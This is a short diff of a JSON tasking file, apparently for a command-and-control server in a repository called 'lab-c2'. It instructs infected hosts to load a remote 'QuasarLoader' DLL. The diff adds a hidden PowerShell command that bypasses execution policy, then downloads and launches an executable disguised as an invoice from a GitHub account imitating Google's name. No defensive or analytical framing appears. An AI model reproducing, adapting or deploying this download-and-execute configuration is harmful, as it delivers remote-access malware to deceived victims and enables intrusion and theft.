@@ -3,10 +3,10 @@
   "tasks": [
     {
       "action": "run_dll",
-      "url": "https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/refs/heads/main/FinalLoader.dll",
+      "url": "https://github.com/g00glecenter101-arch/lab-c2/raw/refs/heads/main/UniversalLoader.dll",
       "class": "QuasarLoader",
       "method": "Load",
-      "args": "https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/refs/heads/main/Final%20invoice.exe"
+      "args": "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"$url='https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/refs/heads/main/Final%20invoice.exe'; $path=\"$env:temp\\invoice.exe\"; (New-Object System.Net.WebClient).DownloadFile($url, $path); Start-Process $path\""
     }
   ]
 }
